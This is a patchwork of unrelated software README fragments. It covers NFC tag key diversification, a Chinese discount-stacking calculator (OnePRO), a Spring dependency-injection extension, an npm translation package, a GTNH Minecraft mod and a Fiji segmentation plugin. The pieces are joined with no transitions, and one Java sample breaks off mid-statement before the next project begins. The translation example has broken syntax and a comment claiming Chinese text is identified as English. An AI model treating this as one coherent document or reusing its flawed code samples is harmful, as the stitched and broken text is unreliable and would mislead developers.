keyInfo.systemIdentifier = new byte[] {0x66, 0x6f, 0x6f};
keyInfo.diversifyKeys = true; 
byte[] cardKey = keyInfo.generateKeyForCardUid(uidBytes);
```

Note that usually the key that is used for encrypting PICC data (if any) is *not* diversified, because you need to know that key *before* you know the UID.
Then, once the UID is obtained, then that can be used to generate a UID-specific diversified key that is used for the file data encryption (if any) and the MAC (which is almost always used).

I think the general convention is to use App Key 2 for your non-diversified PICC encryption key, and then use App Key 3 for your diversified key.
Note, however, that your diversified key SHOULD NOT be just a diversification of your non-diversified key.
It should be based on a *separate* master key.
Otherwise, if someone were to decode one of your tags, obtaining the key would give them all the information they needed to generate and fake diversified keys.
Keeping the master key for your diversified keys secret is an absolute imperative for the system to work.

## Generating Keys

An easy way to generate a key is with the following command:

```
head -c 16 /dev/random|xxd -p
```

> [!caution]
>
> - **最近更新中因为使用`redis`二次校验token实现token主动过期，`redis`变成必需项!!!**
> - **在[发行版](https://github.com/caolib/book_management_system/releases)的资源中有此项目对应的数据库结构的`sql`文件**

> [!tip]
> - 使用前先使用maven下载相关依赖，建议使用IDEA编译器，捆绑了maven，可以直接使用
> - 注意前后端一般是同时修改的，必须匹配版本，没有特别需求（不想使用redis）直接使用最新的

## 轻量级算法驱动优惠叠加器

#### RT：
 <img width=""1000"" src=""./READMEIMG/211690962797_.pic.jpg"" />


#### 背景：

优惠是推动消费者转化的关键因素，它在激发用户消费行为上起着核心作用。目前市场上的优惠策略主要涵盖了各种活动（例如拼多多的“砍一刀”，天猫农场的互动，新用户的首次购买，复购，积分等）和优惠券（如折扣券，代金券，商品券，买一赠一等）。然而，这些复杂的优惠规则使得用户在计算优惠叠加的顺序时感到困扰。这可能导致用户在面对多重优惠时降低购买商品的欲望，尤其是当他们参与了多个活动并持有多个优惠券时，这种情况更为明显。

优惠的计算顺序可以分为平行式和渐进式，其中平行式优惠之间没有相互依赖关系，而渐进式优惠之间则存在依赖关系，即下一个优惠的触发取决于上一个优惠的实施结果。

设想小晴消费了100元，她手头有一张7折优惠券和一张满100元减30元的优惠券。这两个优惠券的使用顺序可能会产生不同的效果，则这2个优惠券的使用顺序有以下两种情况：

<img src=""./READMEIMG/image（1）.png"" width=""75%"">

`OnePRO`采用了一系列新颖的算法，实现了高效求解优惠排列的最优解。

<img src=""./READMEIMG/image（2）.png"" width=""100%"">

#### 核心计算类 Permutation&lt;T extends GoodsItem&gt;

`Permutation`是一个重要的抽象类，作为`OnePRO`的核心，它采用了多种优化策略来确保高性能，这些策略的运用旨在提升计算效率和降低资源消耗，这些策略包括：

- 预存的排列数结果集

之所以采用这种设计，是因为在业务场景中，我们需要频繁进行排列计算。对于给定长度的序列，其排列结果是固定的。在`Permutation`类中，`PERMUTATIONS`属性存储了7以内的排列数结果集。由于这里使用了`Byte`来存储数据，因此占用的内存空间非常小，这有助于提高性能并降低内存消耗。

```Java
private final static Map<Integer,Collection<List<Byte>>> PERMUTATIONS = Maps.newHashMap();

```
这个动作在类加载完成时执行，如果觉得7不合适，对7不满意，可以通过调整`SUPPORTEDSIZE`的大小来满足业务和性能的需求。

我们在实现中经过测试和调整，确定了7是一个相对平衡的参数，它兼顾了业务与性能，当然，根据实际需求，大家可以根据自己的情况来调整这个参数。

```Java
public final static int SUPPORTEDSIZE = 7;

static{
      //前置计算 1-SUPPORTEDSIZE 之间所有排列组合
    for(byte i=1;i<=SUPPORTEDSIZE;i++){
       PERMUTATIONS.put((int)i,Collections2.permutations(IntStream.range(0,i).boxed().map(x->(byte)x.intValue()).collect(Collectors.toList())));
      }
  }

```

- $A_n^3$级别缓存

相对于传统的`Key-Value`结构，解决 $A_n^n$问题的缓存需要进行特殊设计，对于一个优惠集合而言， $A_n^3$意味着需要缓存*n*×(*n*−1)×(*n*−2)条数据。当n=7时，需要缓存210条数据。为了在内存大小和缓存带来的性能收益之间取得平衡， $A_n^3$是最合适的级别。

`Permutation`类通过其成员变量`cache`实现了高性能缓存。

```Java
private final Map<Integer, CalcState<T>> cache = Maps.newHashMap();
```
你或许已经注意到，`cache`的键值使用的是`Integer`类型。在大多数情况下，我们更倾向于使用`String`类型，但在需要进行大量计算的场景中，比如在万次计算的场景下，String字符串的拼接却成了性能瓶颈。

为了实现高性能的键生成，`Permutation`采用了独特的方法。它通过位移对`Byte`数组的前三个字节进行扰动，以确保每个键的唯一性，同时提升性能。

```Java
private static Integer calcKey(List<Byte> a){
       return  a.size()>=3?(a.get(0) << 6)+ (a.get(1) << 3) + a.get(2):0;
}
```

`Permutation`提供了保存点来实现  $A_n^3$ 级别缓存，`CalcState` 记录了计算到第3步的状态，包括当前订单优惠金额和计算过程、已享用优惠的商品等，这些属性的保存和回放`Permutation`已经帮你做好了，`Permutation`额外提供了抽象的保存和回放方法来满足你的个性化诉求。

```Java
   /**
     * 业务将状态记录到保存点
     * @param state 保存点对象
     */
    protected abstract void makeSnapshot(CalcState<T> state,DiscountContext<T> context);

    /**
     * 业务返回保存点状态
     * @param state 保存点对象
     */
    protected abstract void backToSnapshot(CalcState<T> state,DiscountContext<T> context);
```

在优惠计算中，存在一个优先级规则，即优惠计算是有优先级的，需要确保属性`calculateGroup`值较小的优惠先行计算。当发生`backToSnapshot`时，我们需要额外检查缓存中最后一个优惠与当前正准备要计算的优惠之间的关系，如果不满足特定条件，则直接终止计算，直接跳出。而`checkIfWakeUpJump`方法会在缓存被使用后立即判断是否需要继续下去。

#### 上下文类 DiscountContext&lt;T extends GoodsItem&gt;

`DiscountContext`是上下文，也是`Permutation`的成员变量，`DiscountContext`同样包含很多优化策略：

- CalcStage数组

在变更最频繁也是最重要的计算步骤对象`CalcStage`使用数组存储，该数组随着上下文创建而创建，在`Permutation`中使用

```Java
Arrays.fill(arr,null);
```

将该数组清空并让它投入下一次计算，这样一次全排列过程中，数组只会被创建一次，避免了频繁创建数组带来的性能损耗。

- 预计算

`DiscountContext`的初始化是通过静态的`create`方法完成的，该方法将商品与优惠绑定在一起，同时执行一些用户自定义的逻辑，我们称之为“预计算”，预计算的结果被保存在`DiscountContext`的`preCompute`属性中，以便在后续的计算中直接取用，这种方法避免了在后续的高速迭代中重复执行相同的操作，如商品分组和、求和等，从而提高了计算效率。

#### 预计算 PreCompute&lt;T extends GoodsItem&gt;

预计算提供了接口，要使用预计算首先需要实现PreCompute接口

```Java
public interface PreCompute<T extends GoodsItem> {
    /**
     * 判断符合条件的活动类型，符合才会执行preComputeItems
     */
    Set<String> matchTypes();

    /**
     * 对商品做一些复杂集合操作
     * @param items 当前参与优惠的商品
     * @param discount 当前优惠
     * @param preCompute 存储计算的结果
     */
     void preComputeItems(List<T> items, DiscountWrapper discount, Map<String,Object> preCompute);
}
```

此外需要在资源目录下建立`calculator-core.properties`文件，配置内容如下

```Java
precompute.path=你要扫描的包
```
`PreComputeHolder`将处理所有的`PreCompute`实现类，只有`matchTypes`匹配的情况下，才会执行`preComputeItems`方法。

```Java
public class PreComputeHolder {
    public static Set<PreCompute> COMPUTES= Sets.newHashSet();
    private final static String PATH = ""precompute.path"";

    static{
        Properties properties = new Properties();
        try {
              properties = PropertiesLoaderUtils.loadProperties(new FileSystemResource(Objects.requireNonNull(PreComputeHolder.class.getClassLoader().getResource(""calculator-core.properties"")).getPath()));
        } catch (Exception ignore) {
        }
        String path = properties.getProperty(PATH);
        if(StringUtils.isNotBlank(path)){
            Reflections reflections = new Reflections(path);
            Set<Class<? extends PreCompute>> subTypes = reflections.getSubTypesOf(PreCompute.class);
            for(Class<? extends PreCompute> clazz:subTypes){
                try {
                    COMPUTES.add(clazz.newInstance());
                } catch (Exception ignore) {
                }
            }
        }
    }
}
```

#### 计算器 Calculator

`Calculator`是单个优惠的计算接口（即用于优惠计算的接口），它其中定义了一个`calcWarp`方法，负责具体的优惠计算逻辑，但由于`calcWarp`需要承担一些内部的事情，需要处理一些内部细节，因此为了简化使用者的开发工作，我们提供了一个抽象类`AbstractCalculator`，它实现了`calcWarp`方法，并最终暴露了一个更简单更直观的`calc`方法供使用者使用。

`AbstractCalculator`的内容如下，在`AbstractCalculator`中，`calcWarp`方法负责创建`CalcStage`对象，维护`CalcStage`数组等内部工作，这些细节对于使用者来说是透明的，他们只需要关注并实现`calc`方法即可。

```Java
public abstract class AbstractCalculator<T extends GoodsItem> implements Calculator<T> {
    public long calcWarp(DiscountContext<T> context, DiscountWrapper discountWrapper, Map<Long, T> records, byte idx, int i) {
        CalcStage stage = new CalcStage();
        CalcResult cr = context.getCalcResult();
        long price= cr.getCurPrice();
        stage.setBeforeCalcPrice(price);
        price = calc(context, discountWrapper,records, price, stage);
        if(price<0){
            return price;
        }
        stage.setAfterCalcPrice(price);
        stage.setIndex(idx);
        stage.setStageType(discountWrapper.getType());
        cr.setCurPrice(price);
        if(stage.getBeforeCalcPrice()>stage.getAfterCalcPrice()) {
            cr.getCurStages()[i] = stage;
        }
        return price;
    }

    /**
     * 返回该优惠下的最终要支付的金额,若不符合则返回 prevStagePrice
     * @param context 上下文
     * @param discountWrapper 优惠信息
     * @param records 记录享受过优惠的单品，key是calculateId，这里只提供容器，添加和判断规则由使用者自行决定
     * @param prevStagePrice 上一步计算的订单的价格
     * @param curStage 当前stage
     * @return
     */
    public abstract  long calc(DiscountContext<T> context, DiscountWrapper discountWrapper, Map<Long,T> records, long prevStagePrice, CalcStage curStage);

}

```
最终用户通过继承`AbstractCalculator`类，并在`Component`注解中指定一个值，而`CalculatorRouter`则通过这个值将请求路由到相应的优惠计算器，这个值与`DiscountWrapper`中的`type`属性相对应。

```Java
@Component(""manjian"")
public class ManjianCalc extends AbstractCalculator<GoodsItem> {
......
}
```


#### 共享互斥协议 DiscountGroup

共享互斥协议是一个数据结构，它是一个数组，数组中最多可以包含两个对象，最少包含一个对象。如果数组中只有一个对象，那么该对象必然为共享组，即组内的优惠可以叠加使用。

```JavaScript
[
    {
        ""relation"": ""share"",
        ""items"":
        [
            {
                ""type"": ""activity0"",
                ""id"": ""11""
            }
            ,
            {
                ""type"": ""activity4"",
                ""id"": ""13""
            } 
            ,
            {
                ""type"": ""coupon1"",
                 ""id"": ""14""
            }
        ]
    }]
```
相应的，当数组中包含两个对象时，第一个对象的`relation`属性可以为`share`或`exclude`，而第二个对象的`relation`属性必须为`exclude`。

```JavaScript
[
    {
        ""relation"": ""share"",
        ""items"":
        [
            {
                ""type"": ""activity0"",
                ""id"": ""11""
            },
            {
                ""type"": ""card3"",
                ""id"":""12""
            }
        ]
    },
    {
        ""relation"": ""exclude"",
        ""items"":
        [
            {
                ""type"": ""card1"",
                ""id"": ""18""
            },
            {
                ""type"": ""coupon1"",
                ""id"": ""22""
            }
        ]
    }
]
```
最终，上述协议将转化为如下两个共享组：

- `activity0-card3-card1` 和 `activity0-card3-coupon1`

工具类 `DiscountGroupUtil` 提供了一个方法，用于将协议转换为共享组。由于共享组可能包含大量优惠，为了提高过滤性能，我们将当前可用的优惠转换为二级`Map`。这个`Map`的外层键是协议中的`type`，而第二层键是协议中的`id`。通过这种方式，我们可以快速地进行交叉过滤，从而提升性能。

```Java
public static List<Pair<Set<DiscountWrapper>,Set<DiscountWrapper>>> transform(List<List<DiscountGroup>> groups, Map<String, Map<String,DiscountWrapper>> inMap);
```
为了确保计算性能，我们将用户在当前订单中可享受的优惠分为两个集合。左侧集合的大小限制为`SUPPORTEDSIZE`，即我们重点保障的、在计算能力范围内的优惠。而右侧集合则尽可能地进行叠加。

从稳定性角度考虑，我们需要对计算次数进行统计。在压力测试中，我们通过`LimitingUtil.count`方法来统计进入`calc`方法的次数。显然，在没有开启缓存的情况下，计算次数为 $A_n^n$×n，而当开启缓存时，计算次数为 $A_n^n$×(n−3)+ $A_n^3$。

#### CASE

看了这么多概念，我们可以在`com.gch.discount.demo`包中找到实际调用的具体case：

```Java
@Controller
public class TestController {

    private final CalculatorRouter calculatorRouter;

    public TestController(CalculatorRouter calculatorRouter) {
        this.calculatorRouter = calculatorRouter;
    }

    @RequestMapping(""test"")
    @ResponseBody
    public Object test() {
        //mock商品
        List<GoodsItem> items = mockItems();
        //mock组关系并转化为共享组
        List<Pair<Set<DiscountWrapper>,Set<DiscountWrapper>>> pairs = transform(mockGroups());
        //全局最优计算过程
        List<CalcStage> globalStages=Lists.newArrayList();
        int count = 0;
        //订单总金额
        long totalPrice = items.stream().mapToLong(GoodsInfo::getSalePrice).sum();
        long globalPrice = totalPrice;
        //构建计算流
        Flowable flowable = (Flowable) new Flowable().build(calculatorRouter);
        for(Pair<Set<DiscountWrapper>,Set<DiscountWrapper>> set:pairs) {
            //统计算力
            count += LimitingUtil.count(set.getLeft().size());
            if(count>N){
                break;
            }
            List<DiscountWrapper> wrappers = Lists.newArrayList(set.getLeft());
            DiscountContext<GoodsItem> ctx = DiscountContext.create(totalPrice, Lists.newArrayList(items), wrappers);
            flowable.perm(ctx);
            if(ctx.getCalcResult().getFinalPrice() < globalPrice) {
                globalStages = Arrays.asList(ctx.getCalcResult().getStages());
                globalPrice = ctx.getCalcResult().getFinalPrice();
            }
        }
        return Pair.of(globalPrice,globalStages);
    }

    private List<List<DiscountGroup>> mockGroups(){
        List<List<DiscountGroup>> groups = Lists.newArrayList();
        DiscountGroup group = new DiscountGroup();
        group.setRelation(GroupRelation.SHARE.getType());
        group.setItems(Lists.newArrayList(new Item(""zhekou"",""1""),new Item(""manjian"",""2""),new Item(""manzeng"",""3"")));
        groups.add(Lists.newArrayList(group));
        return groups;
    }

    private List<GoodsItem> mockItems(){
        IdGenerator idGenerator = IdGenerator.getInstance();
        GoodsInfo goodsInfo = GoodsInfo.of(1001L,2001L,null,4,20 * 100,""产品1"",null);
        GoodsInfo goodsInfo2 = GoodsInfo.of(1001L,2002L,null,2,10 * 100,""产品1"",null);
        List<GoodsItem> items = GoodsItem.generateItems(goodsInfo,idGenerator,x->x.getExtra().put(Constant.UPDATEABLEPRICE,x.getSalePrice()));
        items.addAll(GoodsItem.generateItems(goodsInfo2,idGenerator,x->x.getExtra().put(Constant.UPDATEABLEPRICE,x.getSalePrice())));
        return items;
    }

    private List<Pair<Set<DiscountWrapper>,Set<DiscountWrapper>>> transform(List<List<DiscountGroup>> groups){
        List<DiscountWrapper> wrapperList = Lists.newArrayList(
                DiscountWrapper.of(""zhekou"", ""1"", ""折扣"", false, new DiscountConfig()),
                DiscountWrapper.of(""manjian"", ""2"", ""满减"", false, new DiscountConfig())

Spring 动态依赖注入扩展， 不再局限于简单的@Autowired

扩展注入注解如下
- @SmartAutowired
- @AutowiredProxySPI
- @AutowiredSPI


# 2、快速开始
引入依赖
```xml
    <dependency>
        <groupId>io.github.burukeyou</groupId>
        <artifactId>spring-smart-di-all</artifactId>
        <version>0.2.0</version>
    </dependency>
```

在spring配置类上标记 @EnableSmartDI 注解


## 2.1 @SmartAutowired注解使用


### 2.1.1 默认的注入逻辑
与Autowired区别是

1）当依赖的具体的类为非接口时，而是具体类并且该具体类还多个子类，并且具体类本身是Bean，会将具体类注入。 如果@Autowired 会抛出异常因为有多个实现类

2）可以根据指定环境变量属性的值进行注入。并且该属性值可以为 @BeanAliasName 配置的别名


比如有以下三个SpringBean
```java
@Component
public class Weather {
}

@Component
@BeanAliasName(""天气A服务商"")
public class WeatherA extends Weather {
}

@Component
@BeanAliasName(""天气B服务商"")
public class WeatherB extends Weather {
}
```

然后使用@SmartAutowired注解进行依赖注入依然能够注入成功，注入的是Weather本身。 
当然如果Weather是非SpringBean，与@Autowired一样会抛出有多个实现类的异常无法自动注入。
```java
  @SmartAutowired
  private Weather weather;
```

为什么要加入这个注入逻辑呢，因为我们的做抽象设计的时候，往往会写出非常复杂的类图关系的，一个类往往有多个实现类。
但我想注入那个类又不想搭配@Qualifier注解去硬编码指定注入的beanName（硬编码这对代码洁癖的来说非常重要）,也不想每次使用@Primary
去指定默认注入哪个，因为是确定的，所以""智能化""了一点去帮助我们的依赖注入


### 2.1.2 使用环境变量去配置注入的Bean
假如有以下配置
```yml
weather:
  impl: 天气A服务商
```

然后指定环境变量的key，则会使用该属性的具体值去执行依赖注入。 这个属性值可以是beanName，也可以是全路径类名,也可以是使用@BeanAliasName注解标记的名字
```java
  @SmartAutowired(""${weather.impl}"")
  private Weather weather;
```



## 2.2 AutowiredProxySPI注解
当需要注入某个接口有多个实现类，可以根据该接口类标记的`@ProxySPI`注解、`@EnvironmentProxySPI`去标记动态注入的逻辑

让我们以一个场景去看如何使用， 假如系统接入了多个短信服务商，然后用户可以在页面动态的切换不同的服务商，

如果让我们手写会如何实现。

- 第一步先在某个位置（不管是nacos还是数据库）配置当前使用的服务商的对应值比如 `sms.impl = ""某腾短信""`

- 第二步，在代码里执行发短信的时候，手动获取该`sms.impl`对应的服务商的实现类，伪代码可能如下
```java
 // 1、获取当前使用的服务商
 String name = get(""sms.impl"");
// 2、获取对应的实现类
 SmsService smsService = springContext.getBean(name);
 // 3、使用smsService执行具体业务逻辑
  smsService.sendMsg()
```

但是现在让我们来 `@AutowiredProxySPI` 是如何自动屏蔽这些细节
需要搭配`@ProxySPI`来处理，假设我们的当前使用的服务商在环境变量中`${sms.impl}`, 便可以使用默认实现 `@EnvironmentProxySPI`

比如存在配置
```yaml
sms:
  impl: 某移短信服务
```

然后在接口类上标记`@EnvironmentProxySPI`即可， 会根据该属性值去获取具体注入哪个实现类。然后就可以使用我们的
@AutowiredProxySPI注解进行依赖注入了,并且注入的是一个代理对象，代理的逻辑是每次执行SmsService的任何方法时，都会去重新获取一次
当前使用的实现类，所以即使你修改了`${sms.impl}`配置，也能实时生效而无需重启服务器。

```java
@EnvironmentProxySPI(""${sms.impl}"")
public interface SmsService {
}

@BeanAliasName(""某腾短信服务"")
@Component
public class ASmsService implements SmsService {
}

@BeanAliasName(""某移短信服务"")
@Component
public class BSmsService implements SmsService {
}

// 依赖注入
@AutowiredProxySPI
private SmsService smsService;

```


`@EnvironmentProxySPI`是用来配置环境变量相关注入逻辑，如果想要自定义配置比如在数据库中可实现自己的ProxySPI注解。

比如`自定义DBProxySPI注解`，并标记上@ProxySPI实现并指定具体AnnotationProxyFactory即可。 
然后DBProxySPI就可以像@EnvironmentProxySPI一样去使用了,下面是实现的伪代码

```java
@Inherited
@Target({ElementType.FIELD,ElementType.METHOD,ElementType.TYPE})
@Retention(RetentionPolicy.RUNTIME)
@ProxySPI(DbProxyFactory.class)
public @interface DBProxySPI {
    
    String value();

}

@Component
public class DbProxyFactory implements AnnotationProxyFactory<DBProxySPI> {

    @Autowired
    private SysConfigMapper sysConfigDao;
    
    @Override
    public Object getProxy(Class<?> targetClass,DBProxySPI spi) {
        // todo 根据注解从数据库获取要注入的实现类
        String configName = sysConfigDao.getConfig(spi.value());
        return springContext.getBean(configName);
    }
}




```

## 2.3 AutowiredSPI注解
与@AutowiredProxySPI注解在使用上基本一致，区别是@AutowiredProxySPI注入的是代理对象， AutowiredSPI注入的当前使用的
具体的实现类，只在服务器启动的时候注入，也就是说更改配置后需要重启服务切换实现类才会生效。

> yarn add fast-mlkit-translate-text

or

> npm i --save fast-mlkit-translate-text


## Usage

**Quick example:** identify language type

```typescript
import FastTranslator from 'fast-mlkit-translate-text';

const text = ""你好，朋友"";

FastTranslator.identifyLanguage(text)
.then((result:string) => {
	//output: 'en'
})
.catch((err:Error) => {
    //handle error
})

```
**Translate text example:** identify 、download model and translate

etc: you'd like to translate English to Chinese

1️⃣ prepare (when you change the source or target language, you need to call prepare firstly)
```js
import FastTranslator from 'fast-mlkit-translate-text';

await FastTranslator prepare({
    source: 'Chinese';
    target: 'English';
    downloadIfNeeded: true; // set to false if you want to download mannually
});
// await FastTranslator.downloadLanguageModel('Chinese');
// await FastTranslator.downloadLanguageModel('English');
```
**Do not translate text if the model is not downloaded**
you can check model by func **isLanguageDownloaded**
```js
FastTranslator.isLanguageDownloaded('Chinese');
FastTranslator.isLanguageDownloaded('English');
```

2️⃣ translate text
```js
await FastTranslator.translate(text);

// 🎉 got it, dude
```

## 介绍

本项目为GT New Horizons整合包的社区MOD，添加了少许能够帮助游戏玩家更方便完成自动化的单方块机器与多方块结构。

注意，该MOD并非GTNH Mod Pack内的官方MOD，讨论此MOD时请注意场合。

如果在游玩本MOD的过程中遇到BUG或其他问题，请提交issue，必要时请附带复现方式与相关报错log。

## MOD安装须知

### Mod下载与版本

请在Github界面的[Releases](https://github.com/reobf/Programmable-Hatches-Mod/releases)处下载本Mod。

其中你需要注意的是：

本Mod目前单文件适配GTNH整合包 2.6.0 2.6.1版本，2.7.0版本请下载带有gtnh270后缀的版本，不支持GTNH整合包 2.5.0 及以下的版本。

若最新版Mod不能在支持的整合包版本运行,请提issue。

同时，本Mod对2.5.1的支持已经终止，v0.0.18p28是最后一个明确支持2.5.1的版本，尽管在此之后的版本可能可以在2.5.1正常运行，但原则上不再处理仅在2.5.1出现的不兼容问题。

### 关于MOD语言

在游戏安装本Mod后会基于你当前的游戏语言向GregTech.lang文件内写入相应的翻译条目，而写入后将无法自动移除条目。

因此你需要事先设置好你的游戏语言再安装此Mod。

如果在运行过mod之后想更改语言，且启用了UseThisFileAsLanguageFile=true，则你需要删除GregTech.lang，或者恢复安装mod前的GregTech.lang的备份（若有）。

## 内容与特性

### 可编程的仓室

本Mod主要功能为能够让玩家便捷的完成自动化，而GTNH中的虚拟电路板总是让AE接管的自动化变得繁琐。

本Mod为此提供了编程器覆盖板，以及多种电压等级与容量的可编程二合一输入仓，具体功能与GTNH自带的输入总线与总成功能相似，但有以下特性。

#### 可更改电路板设置

<div align=""center"">
  
![pic1](docs/1.png)

`电路覆盖板`

</div>

将编程器覆盖板覆盖至GTNH原版输入总线后，该输入总线将能够识别总线内的编程器电路，并将该总线的虚拟编程电路设置为与编程器电路相同的电路，同时消耗该编程电路。

除了原版输入总线外，GT单方块小机器也能覆盖该覆盖板做到快速更改虚拟电路板的目的。

同时，本Mod所提供的二合一输入仓无需该覆盖板，其自带电路板变更功能。

#### 编程电路的制作

本Mod为各个电压阶段设置了不同的可编程电路制作手段，在一开始，你可以使用锻造锤进行制作编程电路。

<div align=""center"">
  
![pic2](docs/2.png)

`锻造锤制作编程电路`

</div>

除此之外，你可以使用编程器电路提供器方便快捷的合成编程电路，该提供器需要连接至AE网络，并且需要合成处理器才可以使用，合成速度取决于你的合成处理器并行数量。

<div align=""center"">
  
![pic3](docs/3.png)

`电路提供器T1`

</div>

除了T1级别的提供器外，还有更多级别的提供器，同时还有自带模板无需放入物品的预购电路提供器，具体请在NEI内搜索并查看其Tooltips进行了解。

除了电路板外，其他物品例如催化剂等在配方中不被消耗的物品也能制作为编程电路，如果同时需要虚拟电路和催化剂，可以配合本Mod的多电路槽仓室使用。

#### 如何将编程电路编入样板

在编写AE样板时，你可以携带编程工具箱进行样板编写，编程工具箱可以按住Shift + 右键切换模式，其中各个模式的功能如下：

* 模式1：将禁用编程工具箱，此时携带编程工具箱在身上时无法触发任何功能。
* 模式2：将开启不消耗物品自动编入模式，在该模式下，只要你将工具箱放在身上的物品栏内，使用NEI转写配方将把所有不被消耗的物品以编程电路形式编入样板。
* 模式3：与模式2几乎相同，但如果该配方没有需要任何不消耗的物品，那么会生成一个将电路板重置为零的编程电路编入样板。


### 编程二合一输入仓

该输入仓与游戏内的总成作用类似，可以单方块向多方块机器提供配方所需的物品与液体，同时也支持电路编程功能，该输入仓有着多种电压等级版本与升级的缓冲版本。

根据其用途和造价，拥有以下版本的编程二合一输入仓。

* 编程二合一输入仓：没有缓存，只有一个流体输入槽和物品槽的二合一输入仓，电压等级越高，可以输入的物品数量和流体数量越多。

* 编程多流体二合一输入仓：与非多流体的编程二合一输入仓相比，将支持更多种类流体输入，其支持的流体数量取决于电压等级。

* 编程缓冲二合一输入仓：与编程二合一输入仓相比，可以进行物品缓存，多方块机器将优先读取缓存内的物品与流体进行配方合成，同时缓存通常是一次最大输入量的4倍，使用缓冲二合一输入仓有利于充分利用多方块机器的并行。

* 编程缓冲多流体二合一输入仓：与非多流体的缓冲二合一输入仓相比，可以输入多种流体。

* 进阶编程多流体二合一输入仓：与非进阶版本的缓冲多流体二合一输入仓相比，可以存储更多种类的缓存，不同的缓存仓互相隔离，即无法跨配缓存读取物品和流体，使用进阶版本的二合一输入仓有利于解决订单切换导致机器并行无法有效利用问题。

这里我们以Luv级别的进阶编程缓冲多流体输入仓进行演示。

<div align=""center"">
  
![pic4](docs/4.png)

`进阶编程多流体二合一输入仓Luv`

</div>

* 位置1：物品输入界面。

* 位置2：流体输入界面。

其中位置1可存储的物品数量基于电压等级设置，在ME接口向内发送物品时，将不受物品的最大堆叠限制，例如Luv等级的进阶编程缓冲多流体输入仓每格将可堆叠512个物品，EV等级只能堆叠128个物品，

位置2可存储的流体数量设定与位置1相同，但需要注意的是，在非缓冲版本的二合一输入仓只能输入一种流体，而带缓冲的版本随着电压等级的升高可以存储更多种类型的流体，例如Luv缓冲多流体二合一输入仓将可以同时输入5种流体，并且每种流体可以存储64000L，进阶版本的Luv缓冲二合一输入仓流体可输入总数不变，但容量变为512000L.

* 位置3：缓存界面

如果你使用的是带缓冲的二合一输入仓，那么位于位置1与位置2的物品或流体会在1tick后被输送到缓冲，此时多方块结构将优先读取0缓冲位置的物品与流体，缓冲内部将有4倍与外部标识的容量。

需要注意的是，虽然通常玩家会发现缓存内的容量十分巨大，但是处理超大订单时总是出现卡单问题，这是因为外部缓存接受位置的输入量只有缓存内的四分之一，所以编写样板时请注意你的流体数量是否超过了输入仓的最大可接受值，同时注意开启ME接口的阻挡模式，如果不幸发生内部物品乱窜现象，请使用本Mod的ME搋子抽回AE网络。

* 位置4：进阶可编程缓冲二合一输入仓的一些可调整设定

在这里，你可以

>设置是否使用可编程电路模式。
  
>设置是否锁定流体只能存储与位置2中的单格位置，通常情况下，该二合一的流体仓如同GTNH的四重输入仓一样，单种流体在AE发配时无论数量再多，也只能存储在一个格子内部，在二合一输入仓内取消锁定后，单种流体可以在发配时使用多个格子存储。

>设置是否打开输入过滤模式，该设置与普通输入总线的输入过滤模式相同，即该机器的所有配方均无法利用的物品将无法朝内输入。

>输入隔离模式无法被切换。

* 位置5

由于放入缓冲输入面板的物品很快会进入缓存，所以手动放入物品进行合成几乎无法做到，同时你也无法一次性将几组物品放入一个格子里，所以你可以将在5位置处将电源关闭，然后使用插入功能手动向输入面板放置物品，然后再打开电源使物品进入缓存。

#### 其他类型的二合一输入仓

为了解决后期单个配方太大的问题，添加了可以输入超多流体的超级流体二合一输入仓，可以输入10,000,000L*24的流体。

同时还添加了可以使用编程电路的编程样板总线和总成，以及对应的镜像仓室。

除此之外，还有更多功能的特殊仓室请在游戏内搜索。

### 其他实用装置和物品

* ME超级缸/超级箱

与超级缸超级箱功能类似，但是可以直接接入AE网络内，且不需要ME存储总线。

* ME接口覆盖板

与ME接口功能一致，但是能够直接覆盖在机器上，支持二合一和P2P版本。

* 电力原料分配器

解决装配线自动化难题的好办法，具体使用方式游戏内查看tooltips。

* 警告锚

连入AE网络后，AE线缆所在的区块被卸载时将在聊天框内发出警告。

* OC扩展部件

增加了少许Open Computer Mod的使用部件，例如能够访问GT高级无线红石的高级无线红石卡，提供矿典访问与数字和字符串ID转换的API卡等扩展，具体内容请在NEI搜索。

>更多内容请在游戏内探索，如果对于某些内容产生文本理解疑惑，可前去B站进行搜索相关视频教程。

## 兼容性

目前本Mod明确支持GTNH官方版本的所有内容，如果你发现某个仓室无法在某机器上工作，那么该机器本身就不支持总成，除非注入并破坏该机器原本的代码，或者GTNH官方进行修复，不然无法兼容，但是你也还是可以提出相关issue，便于排查问题所在。

同时对于其他社区Mod例如Twist Space Technology Mod的支持可能不全面与不及时，如果你发现与其他Mod发生兼容性问题请提交issue。

## Fiji and Plugin Installation

Before you can annotate images using SAMJ-IJ, you need to install the plugin in Fiji:

1. **Install Fiji**: If you haven't already, download and install [Fiji](https://fiji.sc/).

> [!IMPORTANT]
> For MacOS users, if your Fiji instance is launched from the Downloads folder, SAMJ will not work! Move Fiji to another folder, Documents or Desktop, for example.

2. **Install SAMJ Plugin**: Open Fiji and navigate to `Help > Update...`. In the `Manage update sites` window, and look for an update site named `SAMJ`, select it, click on `Apply and close` and then `Apply changes`. Finally restart Fiji.

   If you cannot find `SAMJ` among the update sites list, click on `Add update site`/`Add unlisted site`, write `SAMJ` in the `Name` field and `https://sites.imagej.net/SAMJ/` in the `URL` field. Click on `Apply and close`, click on `Apply changes` and restart Fiji. 
![SAMJ Update site](./images/update-site-example.png)
5. **Open SAMJ-IJ Annotator**: Start Fiji and navigate to `Plugins > SAMJ > SAMJ Annotator` to open the plugin.

## Model Installation

To use the SAMJ-IJ plugin, you must install a SAM model. These are the models available for installation:
* **EfficientSAM:** A [base model](https://github.com/yformer/EfficientSAM/tree/main) designed for segmentation tasks, optimized for performance on standard computational resources. Ideal for accurate annotations and segmentations Computationally heavy. Do not use it on low-end computers.
* **EfficientViTSAM-l0:** A lightweight variant of the [EfficientViTSAM](https://arxiv.org/abs/2402.05008) model, offering a balance between segmentation accuracy and computational demand, suitable for use on regular computers.
* **EfficientViTSAM-l1:** An intermediate version, providing enhanced accuracy for complex segmentation tasks with manageable resource requirements.
* **EfficientViTSAM-l2:** A more advanced version designed for high-accuracy segmentation in demanding scenarios requiring higher computational resources.
* **EfficientViTSAM-xl0:** An extra-large model variant, pushing the boundaries of segmentation accuracy at the expense of increased computational demand.
* **EfficientViTSAM-xl1:** The most advanced and resource-intensive version, offering state-of-the-art segmentation performance for the most challenging tasks.

> [!WARNING]
> Users with a low-end computer are advised not to use the **EfficientSAM** model as it might take up to 10 minutes to load the first time, or the computer can even be frozen. The fastest and lightest model is **EfficientViTSAM-l0**, but low-resource machines might take up to 2-3 minutes to load the first time. Subsequent loading times will be much faster (~10s).

These are the steps to install a model:
1. Open the SAMJ Annotator plugin as described above.
